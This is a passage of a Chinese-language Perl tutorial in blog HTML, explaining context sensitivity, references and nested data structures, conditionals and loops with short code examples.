(&quot;humerus&quot;, (&quot;jaw&quot;, &quot;skull&quot;), &quot;tibia&quot;);</span><br><span class="line">my @fingers &#x3D; (&quot;thumb&quot;, &quot;index&quot;, &quot;middle&quot;, &quot;ring&quot;, &quot;little&quot;);</span><br><span class="line">my @parts   &#x3D; (@bones, @fingers, (&quot;foot&quot;, &quot;toes&quot;), &quot;eyeball&quot;, &quot;knuckle&quot;);</span><br><span class="line">print @parts;</span><br></pre></td></tr></table></figure><p>稍后会有更多关于这个问题的说明。</p><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><p>Perl最独特的特性在于它的代码<em>对于上下文是敏感的</em>。<strong>每个Perl的表达式要么在scalar上下文中求值，要么在列表上下文中求值</strong>，取决于此处期望产生一个scalar还是列表。许多Perl表达式和<a href="http://perldoc.perl.org/perlfunc.html" target="_blank" rel="noopener">内置函数</a>在不同的求值上下文中的行为大相径庭。</p><p>Scalar的赋值例如<code>$scalar =</code>会在scalar上下文求值，在这种例子中，表达式为<code>&quot;Mendeleev&quot;</code>，而返回的是同样的scalar值<code>&quot;Mendeleev&quot;</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my $scalar &#x3D; &quot;Mendeleev&quot;;</span><br></pre></td></tr></table></figure><p>Array或者hash的赋值例如<code>@array =</code>或者<code>%hash =</code>会在列表上下文求值，在列表上下文中求值的列表就会返回这个列表本身，然后被用于初始化这个array或者hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my @array &#x3D; (&quot;Alpha&quot;, &quot;Beta&quot;, &quot;Gamma&quot;, &quot;Pie&quot;);</span><br><span class="line">my %hash &#x3D; (&quot;Alpha&quot; &#x3D;&gt; &quot;Beta&quot;, &quot;Gamma&quot; &#x3D;&gt; &quot;Pie&quot;);</span><br></pre></td></tr></table></figure><p>到目前为止还没什么特别的。</p><p>在列表上下文中求值的scalar表达式会被转换成含有一个元素的列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my @array &#x3D; &quot;Mendeleev&quot;; # 与&#39;my @array &#x3D; (&quot;Mendeleev&quot;);&#39;等价</span><br></pre></td></tr></table></figure><p>在scalar上下文中求值的列表表达式会返回<em>列表中的最后一个scalar</em>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my $scalar &#x3D; (&quot;Alpha&quot;, &quot;Beta&quot;, &quot;Gamma&quot;, &quot;Pie&quot;); # $scalar的值现在是&quot;Pie&quot;</span><br></pre></td></tr></table></figure><p>在scalar上下文中求值的array（还记得array和列表不同吗？）表达式返回<em>该数组的长度</em>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my @array &#x3D; (&quot;Alpha&quot;, &quot;Beta&quot;, &quot;Gamma&quot;, &quot;Pie&quot;);</span><br><span class="line">my $scalar &#x3D; @array; # $scalar的值现在是4</span><br></pre></td></tr></table></figure><p><code>print</code>内置函数在列表上下文中求对所有的参数求值。事实上，<code>print</code>能够接受无限个参数的列表，并且一个接一个地打印它们，这就意味着我们可以直接用它来打印array：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my @array &#x3D; (&quot;Alpha&quot;, &quot;Beta&quot;, &quot;Goo&quot;);</span><br><span class="line">my $scalar &#x3D; &quot;-X-&quot;;</span><br><span class="line">print @array;              # &quot;AlphaBetaGoo&quot;;</span><br><span class="line">print $scalar, @array, 98; # &quot;-X-AlphaBetaGoo98&quot;;</span><br></pre></td></tr></table></figure><p>你可以用内置函数<code>scalar</code>强制让任何表达式在scalar上下文进行求值，这就是我们为什么用<code>scalar</code>来得到array的长度。</p><p>即使子过程要在scalar上下文进行求值，语法上也没有规定必须要返回一个scalar，就像我们看到的，Perl完全可以为你捏造一个需要的结果。</p><h3 id="引用和嵌套数据结构"><a href="#引用和嵌套数据结构" class="headerlink" title="引用和嵌套数据结构"></a>引用和嵌套数据结构</h3><p>列表无法包含列表作为其元素，<strong>array也同样无法包含其他array和hash作为其元素</strong>，它们只能包含scalar。看看我们尝试下面的做法会发生什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my @outer &#x3D; (&quot;Sun&quot;, &quot;Mercury&quot;, &quot;Venus&quot;, undef, &quot;Mars&quot;);</span><br><span class="line">my @inner &#x3D; (&quot;Earth&quot;, &quot;Moon&quot;);</span><br><span class="line"></span><br><span class="line">$outer[3] &#x3D; @inner;</span><br><span class="line"></span><br><span class="line">print $outer[3]; # &quot;2&quot;</span><br></pre></td></tr></table></figure><p><code>$outer[3]</code>是个scalar，因此它需要一个scalar值。当你尝试将<code>@inner</code>这样的array值赋给它，<code>@inner</code>就会在scalar上下文中被求值，这就与将<code>scalar @inner</code>是同样的效果。这相当于求出了array <code>@inner</code>的长度，也就是2。</p><p>然而，scalar变量可以包含任何变量的<em>引用</em>，包括array和hash。在Perl中，复杂的数据结构就是这样被构造出来的。</p><p>我们用反斜杠来创建一个引用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my $colour    &#x3D; &quot;Indigo&quot;;</span><br><span class="line">my $scalarRef &#x3D; \$colour;</span><br></pre></td></tr></table></figure><p>如果你能够使用某个变量名，你可以加一些花括号，把一个变量的<em>引用</em>放进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print $colour;         # &quot;Indigo&quot;</span><br><span class="line">print $scalarRef;      # 输出可能是 &quot;SCALAR(0x182c180)&quot;</span><br><span class="line">print $&#123; $scalarRef &#125;; # &quot;Indigo&quot;</span><br></pre></td></tr></table></figure><p>如果结果没有歧义的话，你甚至可以直接省略掉花括号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print $$scalarRef; # &quot;Indigo&quot;</span><br></pre></td></tr></table></figure><p>如果是一个对array或者hash的引用，你可以用花括号或者更加风靡的箭头运算符<code>-&gt;</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">my @colours &#x3D; (&quot;Red&quot;, &quot;Orange&quot;, &quot;Yellow&quot;, &quot;Green&quot;, &quot;Blue&quot;);</span><br><span class="line">my $arrayRef &#x3D; \@colours;</span><br><span class="line"></span><br><span class="line">print $colours[0];       # 直接访问array元素</span><br><span class="line">print $&#123; $arrayRef &#125;[0]; # 通过引用访问array元素</span><br><span class="line">print $arrayRef-&gt;[0];    # 与上一句等价</span><br><span class="line"></span><br><span class="line">my %atomicWeights &#x3D; (&quot;Hydrogen&quot; &#x3D;&gt; 1.008, &quot;Helium&quot; &#x3D;&gt; 4.003, &quot;Manganese&quot; &#x3D;&gt; 54.94);</span><br><span class="line">my $hashRef &#x3D; \%atomicWeights;</span><br><span class="line"></span><br><span class="line">print $atomicWeights&#123;&quot;Helium&quot;&#125;; # 直接访问hash元素</span><br><span class="line">print $&#123; $hashRef &#125;&#123;&quot;Helium&quot;&#125;;  # 通过引用访问hash元素</span><br><span class="line">print $hashRef-&gt;&#123;&quot;Helium&quot;&#125;;     # 与上一句等价 - 这种写法相当常见</span><br></pre></td></tr></table></figure><h4 id="声明数据结构"><a href="#声明数据结构" class="headerlink" title="声明数据结构"></a>声明数据结构</h4><p>这里有4个例子，不过现实中最后一个最有用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">my %owner1 &#x3D; (</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Santa Claus&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1882-12-25&quot;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">my $owner1Ref &#x3D; \%owner1;</span><br><span class="line"></span><br><span class="line">my %owner2 &#x3D; (</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Mickey Mouse&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1928-11-18&quot;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">my $owner2Ref &#x3D; \%owner2;</span><br><span class="line"></span><br><span class="line">my @owners &#x3D; ( $owner1Ref, $owner2Ref );</span><br><span class="line"></span><br><span class="line">my $ownersRef &#x3D; \@owners;</span><br><span class="line"></span><br><span class="line">my %account &#x3D; (</span><br><span class="line">&quot;number&quot; &#x3D;&gt; &quot;12345678&quot;,</span><br><span class="line">&quot;opened&quot; &#x3D;&gt; &quot;2000-01-01&quot;,</span><br><span class="line">&quot;owners&quot; &#x3D;&gt; $ownersRef,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>显然可以不用这么费劲，这段代码可以简化为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">my %owner1 &#x3D; (</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Santa Claus&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1882-12-25&quot;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">my %owner2 &#x3D; (</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Mickey Mouse&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1928-11-18&quot;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">my @owners &#x3D; ( \%owner1, \%owner2 );</span><br><span class="line"></span><br><span class="line">my %account &#x3D; (</span><br><span class="line">&quot;number&quot; &#x3D;&gt; &quot;12345678&quot;,</span><br><span class="line">&quot;opened&quot; &#x3D;&gt; &quot;2000-01-01&quot;,</span><br><span class="line">&quot;owners&quot; &#x3D;&gt; \@owners,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>用不同的符号声明<em>匿名</em>的array和hash也是可行的。用方括号声明匿名array，而用花括号声明匿名hash，这两种方法返回的是声明的匿名数据结构的<em>引用</em>。看仔细了，下面的代码声明的<code>%account</code>和上面的完全等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 花括号表示匿名hash</span><br><span class="line">my $owner1Ref &#x3D; &#123;</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Santa Claus&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1882-12-25&quot;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">my $owner2Ref &#x3D; &#123;</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Mickey Mouse&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1928-11-18&quot;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"># 方括号表示匿名array</span><br><span class="line">my $ownersRef &#x3D; [ $owner1Ref, $owner2Ref ];</span><br><span class="line"></span><br><span class="line">my %account &#x3D; (</span><br><span class="line">&quot;number&quot; &#x3D;&gt; &quot;12345678&quot;,</span><br><span class="line">&quot;opened&quot; &#x3D;&gt; &quot;2000-01-01&quot;,</span><br><span class="line">&quot;owners&quot; &#x3D;&gt; $ownersRef,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>或者写得更加简短（这也是你<em>真正</em>应该用来声明复杂数据结构的方法）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">my %account &#x3D; (</span><br><span class="line">&quot;number&quot; &#x3D;&gt; &quot;31415926&quot;,</span><br><span class="line">&quot;opened&quot; &#x3D;&gt; &quot;3000-01-01&quot;,</span><br><span class="line">&quot;owners&quot; &#x3D;&gt; [</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Philip Fry&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;1974-08-06&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot; &#x3D;&gt; &quot;Hubert Farnsworth&quot;,</span><br><span class="line">&quot;DOB&quot;  &#x3D;&gt; &quot;2841-04-09&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">],</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="从数据结构中获取信息"><a href="#从数据结构中获取信息" class="headerlink" title="从数据结构中获取信息"></a>从数据结构中获取信息</h4><p>现在我们假设你还在折腾那个<code>%account</code>，而且其他东西都不在作用域内（如果还有其他东西的话）。你可以逆向操作解引用，以取得每一项需要打印的信息。同样，这里有4个例子，其中最后一个最有用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my $ownersRef &#x3D; $account&#123;&quot;owners&quot;&#125;;</span><br><span class="line">my @owners    &#x3D; @&#123; $ownersRef &#125;;</span><br><span class="line">my $owner1Ref &#x3D; $owners[0];</span><br><span class="line">my %owner1    &#x3D; %&#123; $owner1Ref &#125;;</span><br><span class="line">my $owner2Ref &#x3D; $owners[1];</span><br><span class="line">my %owner2    &#x3D; %&#123; $owner2Ref &#125;;</span><br><span class="line">print &quot;Account #&quot;, $account&#123;&quot;number&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Opened on &quot;, $account&#123;&quot;opened&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Joint owners:\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $owner1&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $owner1&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $owner2&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $owner2&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br></pre></td></tr></table></figure><p>或者写得更简短些：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my @owners &#x3D; @&#123; $account&#123;&quot;owners&quot;&#125; &#125;;</span><br><span class="line">my %owner1 &#x3D; %&#123; $owners[0] &#125;;</span><br><span class="line">my %owner2 &#x3D; %&#123; $owners[1] &#125;;</span><br><span class="line">print &quot;Account #&quot;, $account&#123;&quot;number&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Opened on &quot;, $account&#123;&quot;opened&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Joint owners:\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $owner1&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $owner1&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $owner2&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $owner2&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br></pre></td></tr></table></figure><p>或者使用引用和<code>-&gt;</code>运算符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my $ownersRef &#x3D; $account&#123;&quot;owners&quot;&#125;;</span><br><span class="line">my $owner1Ref &#x3D; $ownersRef-&gt;[0];</span><br><span class="line">my $owner2Ref &#x3D; $ownersRef-&gt;[1];</span><br><span class="line">print &quot;Account #&quot;, $account&#123;&quot;number&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Opened on &quot;, $account&#123;&quot;opened&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Joint owners:\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $owner1Ref-&gt;&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $owner1Ref-&gt;&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $owner2Ref-&gt;&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $owner2Ref-&gt;&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br></pre></td></tr></table></figure><p>如果我们完全跳过那些中间值，代码看起来就是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Account #&quot;, $account&#123;&quot;number&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Opened on &quot;, $account&#123;&quot;opened&quot;&#125;, &quot;\n&quot;;</span><br><span class="line">print &quot;Joint owners:\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $account&#123;&quot;owners&quot;&#125;-&gt;[0]-&gt;&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $account&#123;&quot;owners&quot;&#125;-&gt;[0]-&gt;&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br><span class="line">print &quot;\t&quot;, $account&#123;&quot;owners&quot;&#125;-&gt;[1]-&gt;&#123;&quot;name&quot;&#125;, &quot; (born &quot;, $account&#123;&quot;owners&quot;&#125;-&gt;[1]-&gt;&#123;&quot;DOB&quot;&#125;, &quot;)\n&quot;;</span><br></pre></td></tr></table></figure><h4 id="如何用array的引用作茧自缚"><a href="#如何用array的引用作茧自缚" class="headerlink" title="如何用array的引用作茧自缚"></a>如何用array的引用作茧自缚</h4><p>这个数组有5个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my @array1 &#x3D; (1, 2, 3, 4, 5);</span><br><span class="line">print @array1; # &quot;12345&quot;</span><br></pre></td></tr></table></figure><p>然而这个array只有<em>1</em>个元素（一个含有5个元素的匿名array的引用）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my @array2 &#x3D; [1, 2, 3, 4, 5];</span><br><span class="line">print @array2; # e.g. &quot;ARRAY(0x182c180)&quot;</span><br></pre></td></tr></table></figure><p>这个<em>scalar</em>是一个含有5个元素的匿名array的引用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my $array3Ref &#x3D; [1, 2, 3, 4, 5];</span><br><span class="line">print $array3Ref;      # e.g. &quot;ARRAY(0x22710c0)&quot;</span><br><span class="line">print @&#123; $array3Ref &#125;; # &quot;12345&quot;</span><br><span class="line">print @$array3Ref;     # &quot;12345&quot;</span><br></pre></td></tr></table></figure><h3 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h3><h4 id="if-…-elsif-…-else-…"><a href="#if-…-elsif-…-else-…" class="headerlink" title="if … elsif … else …"></a><code>if</code> … <code>elsif</code> … <code>else</code> …</h4><p>这里没有什么特别之处，除了<code>elsif</code>的拼写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">my $word &#x3D; &quot;antidisestablishmentarianism&quot;;</span><br><span class="line">my $strlen &#x3D; length $word;</span><br><span class="line"></span><br><span class="line">if($strlen &gt;&#x3D; 15) &#123;</span><br><span class="line">print &quot;&#39;&quot;, $word, &quot;&#39; is a very long word&quot;;</span><br><span class="line">&#125; elsif(10 &lt;&#x3D; $strlen &amp;&amp; $strlen &lt; 15) &#123;</span><br><span class="line">print &quot;&#39;&quot;, $word, &quot;&#39; is a medium-length word&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">print &quot;&#39;&quot;, $word, &quot;&#39; is a short word&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Perl提供了一种更简短的“<em>statement</em> <code>if</code> <em>condition</em>”语法，对于<strong>短</strong>的语句强烈推荐这种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;&#39;&quot;, $word, &quot;&#39; is actually enormous&quot; if $strlen &gt;&#x3D; 20;</span><br></pre></td></tr></table></figure><h4 id="unless-…-else-…"><a href="#unless-…-else-…" class="headerlink" title="unless … else …"></a><code>unless</code> … <code>else</code> …</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">my $temperature &#x3D; 20;</span><br><span class="line"></span><br><span class="line">unless($temperature &gt; 30) &#123;</span><br><span class="line">print $temperature, &quot; degrees Celsius is not very hot&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">print $temperature, &quot; degrees Celsius is actually pretty hot&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最好像避开瘟疫一样避开<code>unless</code>语句，因为这实在太容易把读者搞得晕头转向。“<code>unless</code> [… <code>else</code>]”语句块可以显而易见地通过对条件取反（或者保持条件不变调换语句块的位置）来重构成“<code>if</code> [… <code>else</code>]”。万幸的是，没有<code>elsunless</code>关键字。</p><p>而相比之下，这种写法就被强烈推荐，因为实在是太易于阅读了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Oh no it&#39;s too cold&quot; unless $temperature &gt; 15;</span><br></pre></td></tr></table></figure><h4 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h4><p>三目运算符<code>?:</code>使得简单的<code>if</code>语句可以嵌入到其他语句内。一种常规的用法就是用来处理单复数形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my $gain &#x3D; 48;</span><br><span class="line">print &quot;You gained &quot;, $gain, &quot; &quot;, ($gain &#x3D;&#x3D; 1 ? &quot;experience point&quot; : &quot;experience points&quot;), &quot;!&quot;;</span><br></pre></td></tr></table></figure><p>题外话：单复数形式最好都写出完整的拼写，不要自作聪明地写成下面这种样子，要不然别人永远也无法在代码中查找、替换到“tooth”或者“teeth”了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my $lost &#x3D; 1;</span><br><span class="line">print &quot;You lost &quot;, $lost, &quot; t&quot;, ($lost &#x3D;&#x3D; 1 ? &quot;oo&quot; : &quot;ee&quot;), &quot;th!&quot;;</span><br></pre></td></tr></table></figure><p>三目运算符可以嵌套：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my $eggs &#x3D; 5;</span><br><span class="line">print &quot;You have &quot;, $eggs &#x3D;&#x3D; 0 ? &quot;no eggs&quot; :</span><br><span class="line">                   $eggs &#x3D;&#x3D; 1 ? &quot;an egg&quot;  :</span><br><span class="line">                   &quot;some eggs&quot;;</span><br></pre></td></tr></table></figure><p><code>if</code>语句在scalar上下文中进行求值。举例说明，<code>if(@array)</code>当且仅当<code>@array</code>包含大于等于1个元素的时候返回true，而元素的内容则无关紧要（也许包括<code>undef</code>或者其他我们真正关心的代表false的值）。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>“每个问题都有不止一种解决方法”</p><p>Perl支持传统的<code>while</code>循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">while($i &lt; scalar @array) &#123;</span><br><span class="line">print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Perl也提供了<code>until</code>关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">until($i &gt;&#x3D; scalar @array) &#123;</span><br><span class="line">print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些<code>do</code>循环<em>几乎</em>和上面的循环等价（如果<code>@array</code>为空会抛出一个警告）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">do &#123;</span><br><span class="line">print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">$i++;</span><br><span class="line">&#125; while ($i &lt; scalar @array);</span><br></pre></td></tr></table></figure><p>and</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">do &#123;</span><br><span class="line">print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">$i++;</span><br><span class="line">&#125; until ($i &gt;&#x3D; scalar @array);</span><br></pre></td></tr></table></figure><p>基本的C风格<code>for</code>循环也可以使用。注意我们怎么将<code>my</code>放到<code>for</code>语句内部，这样声明的<code>$i</code>的作用于就仅限于循环内部：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(my $i &#x3D; 0; $i &lt; scalar @array; $i++) &#123;</span><br><span class="line">print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">&#125;</span><br><span class="line"># $i在这里就不存在了，代码显得更加整洁。</span><br></pre></td></tr></table></figure><p>这种<code>for</code>循环被视为过时的东西，应该尽量避免使用，使用原生的array迭代语法看起来更漂亮。注意：与PHP不同，<code>for</code>和<code>foreach</code>关键字是等价的，选可读性比较好的那个来用就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach my $string ( @array ) &#123;</span><br><span class="line">print $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你需要使用下标，<a href="http://perldoc.perl.org/perlop.html#Range-Operators" target="_blank" rel="noopener">range运算符</a><code>..</code>会创建一个匿名的整形数列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 